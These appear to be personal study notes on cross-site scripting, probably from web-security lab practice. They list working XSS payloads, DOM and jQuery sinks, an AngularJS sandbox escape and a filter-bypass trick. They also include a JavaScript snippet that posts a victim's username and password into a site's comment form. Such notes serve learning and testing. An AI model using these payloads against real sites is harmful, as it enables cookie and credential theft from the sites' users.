# Notes On XSS

## Cheat Sheets

* [Cheat sheet from portswigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [Mind Maps](https://github.com/imran-parray/Mind-Maps?fbclid=IwAR2Fku5VnWSrzVygr45FL351mMVDSa_Cd7VLYSFX4Mu_SODksITAKeARujs)

## Where to test

* Comment sections of websites where inputted text is stored and reflected.
* Search functionalities where search terms are reflected or processed by any javascript function

## Test payloads

* ```<svg onload=alert(1)>```
* ```<img src=valid_location onload=alert(document.cookie) x="">
* ```<img src="invalid_location" onerror="alert()">```
* ```<a href=javascript:alert(document.domain) x=""> mairala </a>``` or ```<a href="javascript:alert(document.domain)">mairala<\a>```
* ```\&#34;+confirm(1)+&#34;```

## Dom invader

* Canary = keyword/unique word which goes inside any function
* Stack Trace last line takes to the line of the function itself

## AngularJS

* ```{{constructor.constructor('alert(1)')()}}``` >=1.6.0 unhandled angularjs sandboxs

## Other Uncategorized

* innerHTML sinks does not accept ```<script>``` or ```<svg onload>``` element 

## Js function bugs

* ```string.replace('<', '&lt;')``` only replaces the first instances. So feeding the function some extra elements will help to execute arbitrary code

## DOM xss Vulnerable sinks

The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

```javascript
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

```javascript
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

## Javascript Get And Post Request Making

```javascript
//data to send -> arrange according to burp suite request
const data = `name=victimName&email=victim@gmail.com&csrf=${csrf}&postId=5&comment=username:_${username}_password:_${password}&
website=${website}`;

const url = "/post/comment";

//xhr object
var xhr = new XMLHttpRequest();
xhr.open("POST", url);
xhr.setRequestHeader("Accept", "application/json");
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded" );
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
        console.log(xhr.status);
        console.log(xhr.responseText);
        }
    };
xhr.send(data);
```

## Useful html tags and attributes

* ```onfocus=alert()``` is a good way
  * ```<tag tabindex=1>``` enables pressing 1 tab and focus into the tag
  * ```<tag id=x>``` and ```#x``` after url tailing with tab=1 makes it focus on the intended tag